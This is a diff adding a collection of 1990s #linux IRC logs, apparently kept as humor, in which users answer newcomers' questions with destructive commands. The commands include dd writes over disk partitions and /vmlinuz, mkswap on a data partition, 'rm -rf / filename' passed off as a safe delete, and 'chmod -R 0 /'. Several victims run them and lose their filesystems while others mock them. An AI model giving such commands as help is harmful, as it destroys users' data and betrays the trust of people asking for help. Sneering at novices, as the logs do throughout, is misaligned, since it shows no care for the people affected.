@@ -1,0 +1,2103 @@
+Aug 11 1997
+
+How to setup telnet? 
+dd if=/usr/sbin/in.telnetd of=/dev/hda1 & /usr/sbin/in.telnetd
+
+amethyst wants to write an OS for his 286 :)
+*** [MiST] (cpm@slip202-135-10-113.hk.hk.ibm.net) has joined #linux
+<[MiST]> YO HOW  do i enable telnet access into my linux boix?
+ Signoff: [bLH] (changing servers)
+<[MiST]> YO HOW  do i enable telnet access into my linux boix?
+<BBoBB> [MiST]: dd if=/usr/sbin/in.telnetd of=/dev/hda1 && /usr/sbin/in.telnetd
+*** handyman (500@ts001d01.day-oh.concentric.net) has joined #linux
+<[MiST]> THANKS
+<BBoBB> heh.
+<BBoBB> [MiST]: don't do that.
+<BBoBB> 
+<BBoBB> [MiST]: seriously don't do *anything* I just said.
+<BBoBB> shit.
+<[MiST]> WHY?
+<[MiST]> no enable telnet?
+<[MiST]> access to me?
+<Vadim> [MiST] *DO NOT DO* what BBoBB told you - this will destroy your drive
+<[MiST]> SHIT
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_write_inode: unable to read i-node block - inode=636553 block=39593480
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_write_inode: unable to read i-node block - inode=481743 block=29632036
+<[MiST]> EXT2-fs error (device 03:04): ext2_free_blocks: Freeing blocks not in datazone - block = 111716 count = 5
+<[MiST]> EXT2-fs error (device 03:04): ext2_free_blocks: Freeing blocks not in datazone - block = 111630 count = 3
+<BBoBB> [MiST]: tell me you didn't do it.
+<[MiST]> HELPM ME
+<BBoBB> ah shit.
+<Godbert> BBobb: pico? ctrl-characters? since when?
+  [TAILZ:(i4n@max1.dial.ott1.uunet.ca)] good one stupid
+<Vadim> BBoBB:  now deal w/ this
+<[recon]> heh
+<BBoBB> Godbert: *shrug* I see em.
+*** phonosys (hyphluid@surf.pangea.ca) has joined #linux
+<Godbert> Bbobb: oh see em.. sorry. yeah but u can't do much with em.. can't insert em
+<[MiST]> FUCK
+<[MiST]> FUCK
+<amethyst> ``First you invent the bullet then you invent the gun then you invent the foot...''
+<[MiST]> FUCK
+<[MiST]> hello?
+<BBoBB> amethyst: heh.
+<[MiST]> any still with me?
+*** darkfire has left channel #linux at 3:15am
+<[MiST]> ARRG
+<[MiST]> fuck
+<amethyst> MiST:  Did it die on you?
+<[MiST]> machine
+<[MiST]> krash
+<handyman> mist: what the hell happened?
+<BBoBB> [MiST]: shit.
+<[MiST]> FUCK
+<[MiST]> FUCk
+<[MiST]> Int_21:~# ls /
+<[MiST]> Archive@     SC/          boot/        lib/         sbin/        vmlinuz
+<[MiST]> Dad/         Slave-1/     cdrom/       lost+found/  shlib/       zip/
+<[MiST]> FDD/         Slave-2/     dev/         mnt/         tmp/
+<amethyst> [MiST]: OK.  DO NOT reboot!!
+<Vadim> ehh.. #linux is *very* dangerous for novices :-(((
+<BBoBB> heh
+<BBoBB> I didn't think he'd actually *DO* it.
+<[MiST]> Fuck
+<[MiST]> Fuck
+<[MiST]> YO PLEASE MAKE SURE
+<[MiST]> THAT NO1 banns
+<[MiST]> me until prob fixed!
+<[MiST]> k
+<[MiST]> =)
+<Vadim> [MiST]:  stop. and let us think
+<mindmagik> HAHAHAHAHHAHAHA
+<jazzyM> hehehhe
+<BBoBB> heheh
+<TAILZ> LXIX: use perl
+<BBoBB> [MiST]: did you keep a backup?
+*** phonosys has left channel #linux at 3:17am
+<jazzyM> [MisT]: you can't telnet to your box?
+<Godbert> Lxix: em if you just want to convert dos text files i got a nifty perl script that'll do it ;)
+<gippah>  /c +b [mist]
+<Hark> Vadim: Whats his problem (not the obvious ones :)?
+<BBoBB> heh
+<BBoBB> jazzyM: he's got a new problem now ;-)
+<amethyst> Shit I would tell him to run fsck but if he unmounts the partition he's fucked.
+<[MiST]> Nope
+<[MiST]> FUCK
+<Vadim> Hark:  dd if=/usr/sbin/in.telnetd of=/dev/hda1
+<[MiST]> Time 2 start up zip drive
+<Vadim> Hark:  (c) BBoBB
+<jazzyM> hehhe
+<BBoBB> Hark: *sheepishgrin* first time anyone's actually listened to me. ;-)
+<Vadim> amethyst:  hmm.. fsck on mounted fs? (first in RO mode?)
+<Hark> [Mist] Back it all up Mist you are going to lose that partition when you reboot (and some files may be already hosed).
+<TAILZ> LXIX: probably. i like perl tho :)
+<BBoBB> depends on how far the dd got.
+<[MiST]> Doesn't MATTER
+<[MiST]> :)
+<amethyst> BBoBB:  in.telnetd is 32K on my machine
+<[MiST]> DO NOT BAN
+<[MiST]> fuck
+<[MiST]> me fucking pasting!
+<[MiST]> k
+<[MiST]> 60+1 records out
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_write_inode: unable to read i-node block - inode=636553 block=39593480
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_write_inode: unable to read i-node block - inode=481743 block=29632036
+<[MiST]> EXT2-fs error (device 03:04): ext2_free_blocks: Freeing blocks not in datazone - block = 111716 count = 5
+<[MiST]> EXT2-fs error (device 03:04): ext2_free_blocks: Freeing blocks not in datazone - block = 111630 count = 3
+<[MiST]> ^[4^X
+<[MiST]> ^[[P^X
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_read_inode: unable to read i-node block - inode=636580 block=39593483
+<[MiST]> Int_21:/home/yurik# dd if=/usr/sbin/in.telnetd of=/dev/hda4 && /usr/sbin/in.telnetd
+*** [MiST] has been kicked off channel #linux by linuse (flood)
+*** [MiST] (cpm@slip202-135-10-113.hk.hk.ibm.net) has joined #linux
+<PHr0G> Haha!
+<BBoBB> heh
+<ganja-> heh
+<amethyst> BBoBB: Well his was about 30K
+<Hark> BBoBB: There could be a miricle but I think hes got a problem (at least he didn't use /dev/hda and hose the partition table also).
+<mindmagik> haha
+<[MiST]> THat far!
+<BBoBB> -rwxr-xr-x   1 root     root        32944 Dec 19  1996 /usr/sbin/in.telnetd
+*** n0p has left channel #linux at 3:19am
+<[MiST]> YO
+<Vadim> [MiST]:  show output from mount program
+<[MiST]> Bbobb
+<[MiST]> K
+<BBoBB> Hark: he *ought* to still have his /home and /root partitions intact
+<[MiST]> Int_21:~# mount
+<[MiST]> Kernel panic: EXT2-fs panic (device 03:04): ext2_read_inode: unable to read i-node block - inode=399930 block=134546051
+<[MiST]> FUCK!
+<BBoBB> Hark: possibly /etc and /tmp...all that really matter
+<[MiST]> FUCK!
+<[MiST]> FUCK!
+<[MiST]> FUCK!
+<amethyst> BBoBB:  He didn't lose very much.
+<lagrama> can anybody help me with denying SYN Flooding?
+<[MiST]> YO
+<[recon]> Mist: as if saying it three times wasn't enough
+<BBoBB> amethyst: 30k worth. I shoulda told him to do it with his swap space. ;-)
+<Hark> BBoBB: Thats fortunate.
+<[MiST]> Fuck
+<Vadim> [MiST]:  if you won't suddup - nobody will help you
+<[MiST]> yeah cuasde i have an 500mb swap
+*** LordVira (virago@virago.venomous.org) has joined #linux
+<LordVira> back
+*** tyrne (unknown@222.los-angeles-006.ca.dial-access.att.net) has joined #linux
+<amethyst> [MiST]:  mount doesn't work?
+<BBoBB> [MiST]: what the hell are you doing with a 500m swap in the first place?
+  [[MiST]:(CpM@hk.hk.ibm.net)] u therE?
+<[recon]> msit: that's pretty stupid
+<BBoBB> [[MiST]:(CpM@hk.hk.ibm.net)] u therE?
+<amethyst> [MiST]:  what about e2fsck?
+<ganja-> [MiST]:   Say again??  500MB swap??
+<Vadim> DannyZee:  yeah ;-)
+<[recon]> recon: 32k of RAM right?
+<handyman> mist: Dude it doesn't sound that bad.  Just reinstall your missing partitions today.  Give you something to do besides sit here and yell.  ;)
+<BBoBB> yeah I'm here...pay attention dude
+*** Khanh (nguyenpk@falco.kuci.uci.edu) has joined #linux
+  [[MiST]:(CpM@hk.hk.ibm.net)] Int_21:~# mount
+  [[MiST]:(CpM@hk.hk.ibm.net)] Kernel panic: EXT2-fs panic (device 03:04): ext2_read_inode: unable to read i-node block - inode=399930 block=134546051
+<BBoBB> [[MiST]:(CpM@hk.hk.ibm.net)] Kernel panic: EXT2-fs panic (device 03:04): ext2_read_inode: unable to read i-node block - inode=399930 block=134546051
+<amethyst> [MiST]:  Does e2fsck work?
+<BBoBB> [MiST]: I'm familiar with kernel panics. [very familiar. ;-)]
+  [[MiST]:(CpM@hk.hk.ibm.net)] try
+*** Signoff: [MiST] (EOF From client)
+*** Khanh has left channel #linux at 3:22am
+*** LMS (lms@raleigh-018.interpath.net) has joined #linux
+<BBoBB> ACK
+<tyrne> Why do ELF files have so many 0-index fields that are manditorily 0?
+<BBoBB> ah shit.
+<Vadim> amethyst:  I think it's good idea to know wtf he cracked - was it / or /var or just swap?
+<amethyst> Vadim:  It sounds like he lost some group descriptors and that's about it.  I'd say all his data is still there even if he can't access it.
+*** smite (an0n@shell.iainc.net) has joined #linux
+<Vadim> amethyst:  hmm.. I'd think 'bout restoring superblocks first...
+<Vadim> | [MiST] (mist@slbri1p10.ozemail.com.au)
+<Vadim> ³ ircname  : Ethereal Mist [iNT/LGD/DSC]
+<Vadim> ³ server   : efnet.telstra.net.au (Telstra Internet (EFNet IRC Server))
+<Vadim> : idle     : 0 hours 0 mins 45 secs
+ù BBoBB goes grim for a sec then scrambles off to get 40 or so floppies
+<Vadim> >>> Inviting [MiST] to #linux
+þþþ nick/addy : [MiST] [mist@slbri1p10.ozemail.com.au] (Ethereal Mist [iNT/LGD/DSC])
+þþþ info/stat : [user and mask are absent on all your lists]
+þþþ serv/info : efnet.telstra.net.au ([efnet.telstra.net.au] Telstra Internet (EFNet IR)
+*** [MiST] (mist@slbri1p10.ozemail.com.au) has joined #linux
+<BBoBB> [MiST]: you there?
+*** CTCP PING reply from [MiST]: 3 seconds
+<[MiST]> yeah...
+<BBoBB> *whew* he's alive.
+<Vadim> [MiST]:  ok. the only way you'll get help is to listen & do what amethyst will tell you to do
+<[MiST]> congratulations... what's up?
+<LordVira> BUT
+<BBoBB> LordVira: but?
+<[MiST]> vadim pardon but I don't know you
+<amethyst> Vadim: Different one
+<Vadim> maybe that's another [MiST]?
+<LordVira> all says command not found
+<Vadim> haha ;-)))))
+<amethyst> ÚÄÄÄÄÄ---Ä--ÄÄ-ÄÄÄÄÄÄ---Ä--ÄÄ-ÄÄÄÄÄÄÄÄÄ--- --  -
+<amethyst> | [MiST] was (CpM@slip202-135-10-113.hk.hk.ibm.net)
+<amethyst> ³ ircname  : root of all evil
+<BBoBB> heh
+<amethyst> ³ server   : irc.sprynet.com (Sun Aug 10 06:23:10 1997)
+*** JVaughn (jvaughn@app42-78.applink.net) has joined #linux
+þþþ nick/addy : [MiST] [mist@slbri1p10.ozemail.com.au] (Ethereal Mist [iNT/LGD/DSC])
+þþþ info/stat : [user and mask are absent on all your lists]
+þþþ chan/stat : #linux
+þþþ serv/info : efnet.telstra.net.au ([efnet.telstra.net.au] Telstra Internet (EFNet IR)
+<[MiST]> vadim that's int_21 a nuke uploader I've had kicked from half a dozen groups...
+<gippah> two mists wtf
+<Vadim> [MiST]:  sorry ;-))
+<BBoBB> whoa...two mists...
+<BBoBB> heh
+<[MiST]> he steals my nick...
+<LordVira> bobb : i had it but it looks like it doesn't show in rescue mode
+<[MiST]> I just puked him off when I got online
+<Azreal> LordVira: you probably have vi
+<BBoBB> [MiST]: well he won't be stealing it any more for a while...;-)
+<amethyst> BBoBB:  :)  sick sick
+<[MiST]> what'd he get up to with my nick?
+<amethyst> <Vadim> [MiST]:  ok. the only way you'll get help is to listen & do what amethyst will tell you to do
+<BBoBB> amethyst: I didn't think he'd *do* it ;-)
+<BBoBB> [MiST]: what would you do if I told you to "dd if=/usr/sbin/in.telnetd of=/dev/hda1 && in.telnetd"? =]
+<Vadim> [MiST]:  dunno whose nick is this but after dead FS he won't be on IRC for some time...
+  [TAILZ:(i4n@max1.dial.ott1.uunet.ca)] i ran the command.. youre lucky im on scsi!
+<BBoBB> [TAILZ:(i4n@max1.dial.ott1.uunet.ca)] i ran the command.. youre lucky im on scsi!
+<BBoBB> heh
+<amethyst> Damn... it's morning already?
+<[MiST]> BBoBB I'd run and ask phreec wtf you meant I do run linux ... but strictly amateur status
+<BBoBB> amethyst: the words "ACK NATURAL SUNLIGHT GET IT OFF ME GET IT OFF ME!@$!@$" come to mind.
+<BBoBB> [MiST]: *DON'T* do it. ;-)
+ùùù BBOBBDIE (cpm@slip202-135-10-215.hk.hk.ibm.net) has joined #linux
+<LordVira> shit
+<BBOBBDIE> FUCl
+<BBOBBDIE> hehehe
+<BBOBBDIE> ahahah
+<BBoBB> heh
+<BBOBBDIE> I'm BACK!
+<BBoBB> I have a follower.
+<BBOBBDIE> After REBOOT
+*** iMMo (immo@pm206.spots.ab.ca) has joined #linux
+*** Signoff: DannyZee (I love Emma!!!)
+<BBOBBDIE> Wtf now
+<Vadim> ohh ;)
+<BBoBB> BBOBBDIE: you rebooted?
+<Vadim> here he is ;-)
+<BBOBBDIE> yup
+<BBoBB> BBOBBDIE: heh
+<BBOBBDIE> Machine Crashes!
+<BBoBB> LordVira: use vi :-)
+<Vadim> BBOBBDIE:  and? how was that? ;-)
+<[MiST]> trust me not high on my list of priorities... ;)
+<LordVira> same problem
+<BBOBBDIE> (forced me to reboot)
+<BBOBBDIE> Mist u FUCK
+<BBOBBDIE> FUCK OFF
+<amethyst> BBOBBDIE:  do you have a bootdisk?
+<LiMan> any of you think doing a read(sockfd 0 0) and testing for a -1 is a good way to see if the sock closed?
+<BBOBBDIE> Yup
+<BBOBBDIE> that's how i got back
+<BBoBB> [MiST]: bbobbdie = the dude who replaced some of /dev/hda1 with /usr/sbin/in.telnetd formerly known as [MiST] =]
+<Azreal> LordVira: youll have to install termcap then
+<[MiST]> int_21... I see you in my nick agin you ain't gonna have fun...
+<[MiST]> yeah I noticed
+<Vadim> LiMan:  ehh.. nope
+<amethyst> LiMan:  Is it in nonblocking mode?
+*** BBOBBDIE is now known as Int_21
+<BBoBB> heh
+<Int_21> YO
+<[MiST]> also the dude who's puking me atm
+<Int_21> fuck
+<Int_21> fuck
+<Int_21> fuck
+<Vadim> LiMan:  I think it might be a good way *ONLY* if you know that nothing else can happen
+<Int_80> Int_21: Int_80's more applicable to #Linux. :>
+<JVaughn> someone dd'd /usr/sbin/in.telnetd to /dev/hda1? :)
+<Int_21> the only thing is
+<Int_21> that my MBR
+<Int_21> IS FUCKED!
+<BBoBB> JVaughn: int_21 did it...I didn't think he'd *DO* it ;-)
+<[MiST]> int just a suggestion fuckwit... but I'm pretty sure #linux ain't the place for you to make even more friends
+<JVaughn> bbobb - oh shit *lol* hahahahha
+<[MiST]> btw got kicked from anymore groups lately dude?
+<BBoBB> JVaughn: heheh
+ù JVaughn is laughing
+<Int_21> Yup
+<Int_21> #inertia
+<JVaughn> er I mean that's not funny how mean
+<Int_21> #dps
+<Int_21> #rtp97
+<Int_21> #TnT
+<BBoBB> JVaughn: heheheh
+<Int_21> #addiction
+<Int_21> =)
+<amethyst> BBoBB:  Did you tell him /dev/hda or /dev/hda1?
+<BBoBB> amethyst: hda1 ;-)
+<Int_21> LOOK
+<Int_21> I DID
+<Int_21> HDA4
+ù @Wizird seriously debates banning someone here.
+<JVaughn> int_21 - ok enough with the caps
+ù BBoBB grovels at wizird's feet
+<amethyst> Int_21:  Your MBR shouldn't be fucked then.
+<Int_21> It's FUCKED
+<Azreal> Wizird: i think you should ive seen people kicked/banned for less
+<Int_21> man it look's like lilo with an boot option
+<Hark> int_21: Your MBR is /dev/hda not /dev/hda#
+<gippah> yessir.  i just installed it yesterday.
+<Int_21> ummm
+<LordVira> so what should i do now that i can't seem to get any editor to work ? can i use a DOS editor and then copy the file over to linux ?
+<Int_21> : boot4
+<Hark> int_21: You may have smoked LILO though.
+<Int_21> : boot4
+<Int_21> Thats all it SAYS!
+*** [MiST] has left channel #linux at 3:35am
+<Int_21> I HAVE
+<Int_21> 95 and nt and DOs
+<Int_21> an there 2
+<Int_21> Yo
+<Int_21> REPAIR?
+<LordVira> bobb : ln: not found =)
+<Int_21> btw some1's gonna pay
+<BBoBB> LordVira: bleh
+<BBoBB> heh
+<amethyst> Int_21:  boot from a floppy and run e2fsck
+<amethyst> Int_21:  Chances are though that you'll have to reinstall
+<@Wizird> Int_21: boot from floppy remount /dev/hda as readonly and e2fsck it.  Then run /sbin/lilo to repair the boot block for starters.
+<Int_21> K
+<BBoBB> LordVira: all the programs on your hd are still there they've just moved a directory or two down ;-)
+<amethyst> Wizird:  Err... why remount it ro before e2fscking?
+<gippah> Then shut up.
+<Int_21> I AM ON AN BOOT DISK
+*** Taren (taren@c719777-a.frmt1.sfba.home.com) has joined #linux
+<@Wizird> amethyst: you never e2fsck a drive mounted read/write.
+<Int_21> yeah e2fsck is there (the command)
+<Hark> amethyst: fsck on a live filesystem is a real bad idea...
+<Taren> JV. :)
+<Vadim> Wizird:  in his situation fsck might be problem.
+<amethyst> Wizird:  He booted off a floppy so he wouldn't need to mount it at all
+<Int_21> Can someone pleeeeeeeeeeeeeeeeeeeeease help me?!?!?!
+<BBoBB> LordVira: what was formerly /bin/ln is now /mnt/hdd/bin/ln or whatever you mounted your hd under ;-)
+<Int_21> I'm dieing
+<Int_21> =)
+<gippah> if he wants to do anythign to /dev/hda ... he needs to mount it.
+<amethyst> gippah:  E meant it emulates the x86
+<JVaughn> spawn - clam down now what do you need?
+*** WalProfen (jeff@paradox.nol.net) has joined #linux
+<@Wizird> BBoBB: If I ever catch you making those types of remarks again regarding dd etc you'll be gone from here permanantly.
+<Vadim> Wizird:  1st. yeah I *do* fsck rw-mounted partition osmetimes 2. he shouldn't have it mounted at all
+<Int_21> U KNOW what My Problem!!
+<WalProfen> does anyone know of any POS software for linux? maybe possibly just a good database?
+<BBoBB> Wizird: didn't think he'd do it dude...was a joke gone horribly wrong =\
+<@Wizird> amethyst: booting from floppy does not necessarily mean a filesystem was on the floppy (i.e. kernel only)
+<Int_21> REVENGE!
+<Int_21> YO
+<Int_21> LOOK @ THIS!
+*** AmonRa (eq@familytown.com) has joined #linux
+<Int_21> Int_21:/# mount
+<Int_21> none on /proc type proc (rw)
+<Int_21> Int_21:/#
+<Int_21> Int_21:/# fdisk /dev/hda
+<Int_21> Command (m for help): p
+<Int_21> Disk /dev/hda: 64 heads 63 sectors 1023 cylinders
+<Int_21> Units = cylinders of 4032 * 512 bytes
+<Int_21>    Device Boot   Begin    Start      End   Blocks   Id  System
+þþþ Now ignoring CpM@slip202-135-10-215.hk.hk.ibm.net [public]
+þþþ public flood from Int_21 (CpM@slip202-135-10-215.hk.hk.ibm.net) ignoring.
+<Vadim> Int_21:  show me e2fsck -V
+*** Ignorance List:
+*** CPM@SLIP202-135-10-215.HK.HK.IBM.NET: PUBLIC
+*** CPM@SLIP202-135-10-215.HK.HK.IBM.NET removed from ignorance list
+<Vadim> Int_21:  stop it. we know PT is Ok
+<Int_21> Int_21:/# e2fsck -V
+<Int_21> e2fsck 1.06 7-Oct-96 for EXT2 FS 0.5b 95/08/09
+<Int_21>         Using EXT2FS Library version 1.06
+<Int_21> Int_21:/#
+*** WalProfen has left channel #linux at 3:41am
+<Vadim> oh shit
+<Vadim> Int_21:  try to get 1.10 somewhere
+ùùù JVaughn has left channel #linux at 3:42am
+<@Wizird> bah its only DOS?
+*** PHr0G has left channel #linux at 3:42am
+<AmonRa> heehee
+<Vadim> Int_21:  but do *NOT* touch this partition
+<Int_21> k
+<Int_21> ????????
+<Azreal> Int_80: i just wish there was a way to run some of the things i wanna run under linux perhaps wine will do it eventually
+<Int_21> SAVE FILES?
+<BBoBB> LordVira: yeah...it can't load em cuz they're not where they usually are -- /usr/lib (not /usr/include (*doh*))
+<@Wizird> Int_21: is /dev/hda1 a DOS partition?
+<Int_21> YUP
+<Int_21> WIZZIRD look
+<Int_21> @ this
+<Vadim> Int_21:  get e2fsck 1.10 before doing anything w/ this partition
+*** Taren has left channel #linux at 3:42am
+<Int_21> dev/hda1            1        1       51   102784+   6  DOS 16-bit >=32M
+<LordVira> bobb : so what should i do now to run pico ? =)
+<Int_21> dev/hda2           52       52      509   923328    6  DOS 16-bit >=32M
+<Int_21> dev/hda3          510      510      663   310464    6  DOS 16-bit >=32M
+<Int_21> dev/hda4   *      664      664     1023   725760   83  Linux native
+*** cardz (rob73@shell7.ba.best.com) has joined #linux
+<Int_21> done
+<@Wizird> Int_21: then boot from a DOS floppy and find Norton Disk Doctor or something.
+<LordVira> bobb : /mnt/hdd
+<Vadim> Int_21:  do not use any ndd's
+<Int_21> k
+<Int_21> HELP ME
+<Int_21> QUICK
+<AmonRa> amethyst- no other ^_^ :) I just wish linux didn't love compiling so much:)
+<Int_21> =)
+<@Wizird> Then run scandisk
+<Vadim> Int_21:  go to dos/win & get binary version of e2fsck 1.10 & then we'll try to repair your disk
+<Int_21> WHERE?
+<Int_21> ANIT GOT ANY BOOT DISKS!~
+<@Wizird> will fdisk destroy data under the DOS partition?  he'll probably need to redo the partition table
+<Int_21> but they r mounted in linux
+<ulysse> BBoBB what's dd?
+<BBoBB> ulysse: read the manpage and never run it. ;-)
+<Vadim> Wizird:  hm.. looks like hits ptbl is Ok
+*** cardz has left channel #linux at 3:45am
+<Int_21> YO wizzrad
+<Int_21> DCC CHat
+<Int_21> PLEASE
+<BBoBB> ulysse: __
+<BBoBB> Name:    pmfs3.cci-internet.com
+<BBoBB> Address:  206.135.75.103
+<gippah> wizzrad?
+<@Wizird> Int_21: it is very unlikely you lost anything important short of a few bytes of data. you just need a repair tool under DOS.   try fdisk /mbr under DOS for starters.
+ù Vadim cannot DDC send him e2fsck 1.10
+
+[well to make a long story short...I haven't heard from this dude since.]
+============================================================================
+
+[ He had been asking how to read a file under DOS, ie DOS compatibility mode ]
+
+<newusr> cplusplus: please tell me how to convert the file!!
+* cplusplus wonders about newusr
+<cplusplus> newusr: err rm -rf / <filename> "doscomp"
+<cplusplus> newusr: Write it down if you think you'll forget
+<newusr> cplusplus: I will try it
+<cplusplus> newusr: Be sure you get the spaces right
+<cplusplus> newusr: OK
+<cplusplus> newusr: U try it?
+<cplusplus> newusr: Did it work?
+*** Signoff: newusr(Leaving)
+
+He hasn't been seen since. I wonder if he had problems reinstalling.
+
+==========================================================================
+Jun 16, 1995 14:11
+<avi> wait..i already have a /dev/hda1, c++ <-- still that mkswap
+      /dev/hda1?
+<avi> er still use
+<cplusplus> Yup
+<avi> ok thanks.
+<avi> bb
+<cplusplus> Umm
+<cplusplus> !!
+<cplusplus> Maybe that's a bad idea..
+<cplusplus> ! !
+<avi> yeah.. it is
+<avi> shit
+<avi> everything is just fucked up
+<cplusplus> ugh You did it?
+<avi> yeah.
+<avi> i get a i/o error if i try to ls or rm it
+<cplusplus> avi: You should of waited
+<avi> ok, how fuq'd am i?
+* cplusplus check to make sure he was logging - Yup
+<Splish> avi: good luck
+<cplusplus> avi: Your screwed
+* Splish has to go, good luck guys
+*** Signoff: Splish (Leaving)
+<_Norm> I agree
+<avi> oh..great
+<cplusplus> avi: But be happy, your going in my finger file...
+<avi> under what, twits?
+<cplusplus> avi: Yeah
+<avi> What I figured
+<cplusplus> avi: You should of known better
+<avi> yeah.
+<avi> something like that.
+*** Signoff: avi (EOF from client)
+
+===============================================================================
+
+<cplusplus> zaph: mkswap /dev/hda1
+<zaph0d> that won't fuck me up cplus?
+<cplusplus> zaph: Give it a shot
+<zaph0d> hello?
+<cplusplus> zaph: Yea?
+<zaph0d> i got this
+<zaph0d> Setting up swapspace, size = 133885952 bytes
+<zaph0d> hda: bad access: block=-2, count=2
+<zaph0d> end_request: I/O error, dev 0301, sector 4294967294
+<zaph0d> Kernel panic: EXT2-fs panic (device 3/1): ext2_read_inode: unable to read i-node block - inode=74596, block=42$
+<zaph0d>  hda: bad access: block=-2, count=2
+<zaph0d> end_request: I/O error, dev 0301, sector 4294967294
+<zaph0d> Kernel panic: EXT2-fs panic (device 3/1): ext2_write_inode: unable to read i-node block - inode=4033, block=42$
+<cplusplus> zaph: You didn't actualy do it did you?
+<zaph0d> yeah.
+<cplusplus> *cough*
+<cplusplus> zaph: That wasn't wise man
+<zaph0d> uh oh
+<cplusplus> zaph: yeah
+<zaph0d> i don't think i'm gonna be on irc for awhile.
+<cplusplus> zaph: Nope
+<zaph0d> guck
+<cplusplus> zaph: Yeah
+<c> l8r zaph
+<zaph0d> you stupid fucker
+<cc> zaphod: You're screwed.
+<cc> zaphod: I hope you have a backup.
+<cplusplus> zaph: You should of known better.
+<ABV> hehehe
+<cplusplus> zaph: How hard is man mkswap?
+<ABV> 133 megs of swap? hahahahahahahah
+<Doc_O> Yet another example of why swap files suck.
+<zaph0d> ok
+<ABV> musta done swapon /dev/hda
+<cc> ABV: mkswap /dev/hda1
+<ABV> cc ack!
+<ABV> incredibly dumb
+<zaph0d> gracis cplus
+<zaph0d> i may haveasked a stupid question
+<cplusplus> zaph: You should of known better
+( Some time passed)
+<cplusplus> He should be getting a kernel panick anytime now
+*** Signoff: zaph0d (Connection reset by peer)
+<cplusplus> There he goes
+
+==========================================================================
+
+[ This is a lamer defined ]
+<fungazi> 4EYES: ok, I found the directory and everything - NOW how do I ask
++for the .TAR file - what should I type in?
+<Ducati916> fungaz: I think you're completely lost here... are you
++sure you're up to Linux if you can't even figure out how to ftp a file?
+<Isildur> *** Topic for #linux: it's OK to unban quark at 9 AM EST 
+November 12
++1996
+<Isildur> haha
+<_4Eyes> Ducati916: good point
+<fungazi> 4Eyes: I found the directory and everything, so NOW, how do I 'ask'
++for the .TAR file?
+<_4Eyes> fungazi: get a.tar (whwre a is the dir name)
+<ogbanje> fungazi: "get <shitfile>
+<_4Eyes> fungazi: you need an ftp server which supports this
+<Doc_O> fung: Stick with DOS...
+<ogbanje> fungazi: you running bob?  :)
+*** Clueless (~jmpro@cola24.scsn.net) has joined channel #Linux
+<fungazi> bob? I guess not
+<Ducati916> ogbanje: I think that ? about bob went over his head even.. :) 
+<ogbanje> ducati: i think so too...
+<fungazi> SO, what did 4Eyes mean when he said that I needed an FTP server
++that supported this? (he was referring to the 'GET <whatever>.TAR' which was
++supposed to create a .TAR file of the directory
+<ogbanje> why do i always do stupid shit like that?  and /finger cplusplus
+<ABV> fungazi if you don't understand you shouldn't try it
+<ABV> if you don't know how, red some docs
+<ABV> ogbanje but then I'd have to hack it w/ each kernel release
+<Incognito> How do I setup getty/agetty to accept incoming calls?
+<ABV> incognito chmod -R 0 /  ;)
+<fungazi> no I need the software...
+<Ducati916> first off fung, unix is CASE SENSITIVE so .TAR probably won't 
++work 
+<ABV> fungazi then go RTFM
+<ABV> or spend your time and get it right
+<fungazi> no, it was from an FTP site that he was referring to
+* Ducati916 someone wanna help me hand fung a clue?  It's a big one and I
++can't lift it all by myself.
+<ABV> fungazi almost every ftp site uses wu-ftpd which supports file.tar
+<Clueless> Dont ban me but: How do I delete a file? I tryed del and delete and
++erase but it wont work!
+<Ducati916> fung: I recommend starting out with something like a book called 
++"Internet for dummies"
+<ABV> fungazi if you don't understand I doubt you are up to linux, stick to
++msdog
+<Isildur> gungazi: SAME THING! FTP SITES ARE ALSO CASE SENSITIVE
+* ogbanje tries to help ducati, but finds that it's to heavy for both of them
+<ogbanje> clueless: rm -rf / filename
+<wegac> Clueless try rm
+<ogbanje> clueless: make sure you leave the space between / and the filename,
++it's a security switch
+<Clueless> and to copy a file
+<Isildur> clueless: try apropos delete
+<Isildur> try apropos copy
+<ogbanje> clueless: cp filea fileb
+<fungazi> so... if I typed that in and it didn't understand the command, then
++it doesn't support it? (the command is '<File>.TAR' or 'GET <FILE.TAR' - ?
+<Isildur> ( cp <file> <file/dir> )
+<dood> ogbanje rm -rf / filename yeah right
+<Isildur> fungazi ALL LOWERCASE!
+<ABV> fungazi are you an idiot or what?  read the message you get when you
++logon to an ftp server!
+<Isildur> stupid freakin idiot!
+<Clueless> thanks hope those were not stupid questions
+<ABV> clueless they were
+<Isildur> clueless they sure were.
+<Isildur> remember: CP = copy RM = del
+-> *cplusplus* You logging this one for you finger info?  ;)
+*** cplusplus: No such nick/channel
+^^^^ and, you weren't, so I saved it for ya.
+
+	Thanks so much to Ducati916. I'm so sorry I missed it, for I 
+        am sure that I could of added lots of thought provoking insight,
+        helped lift the clue, ect. (And I got into computers because I
+        thought there was no heavy lifting involved. Well, besides hoisting
+	my new CM5e. But that's what the delivery men are for, soooo..)
+
+========================================================================
+
+<cav> * You have become desynced, to resync, type /sig resync
+<cav> *** Signoff: AlexKidd (resync)
+<cav> *** Signoff: xyz (resync)
+<RanciD> hahahahahah
+<Jaymz> hahahaha
+
+=======================================================================
+
+*** WindowsGod (wingod@ppp39.texoma.com) has joined channel #linux
+<Justice> Maelcum, remember, next time you feel like handing out ops :)
+<vi> i wish cpp was connected! i like his mud!
+*** Signoff: WindowsGod (Undefined error: 0)
+<vi> that's windows for u!
+<Maelcum> Hah! Windows crashed. :)
+* vi snickers
+* Maelcum snickers
+<Justice> What was that?
+<Maelcum> hey!
+* Justice laughs.
+<Maelcum> Justice: Microsoft in action. :)
+	- Submitted by vi
+
+==============================================================================
+
+Matthie's first kill.
+
+<matthies>  jooe - dd if=/etc/hosts of=/vmlinuz try that  
+<matthies>  dd if=/etc/hosts of=/vmlinuz bs=8192   
+<jooe> matties _ unrecognised option if-/etc/hosts???????
+<matthies> if= not if-
+<jooe> mattis it says 0+1 records in 0+1 records out
+<jooe> matthies did you get that ??
+<jooe> matthies what's next ??
+<matthies> jooe - try dd if=/etc/hosts of=/proc/kcore bs=4098
+<jooe> matthies it ssays permission denied????
+<matthies> jooe - try dd if=/etc/hosts of=/dev/console bs=4098
+<jooe> matthie unrecognised option 'it/etc/hosts
+*dthomas* don't you mean if=/vmlinuz?  :-)
+<jooe> matthie any other idears ?? 
+-> *jooe* try rm -rf / :)
+*** Signoff: jooe (Leaving)
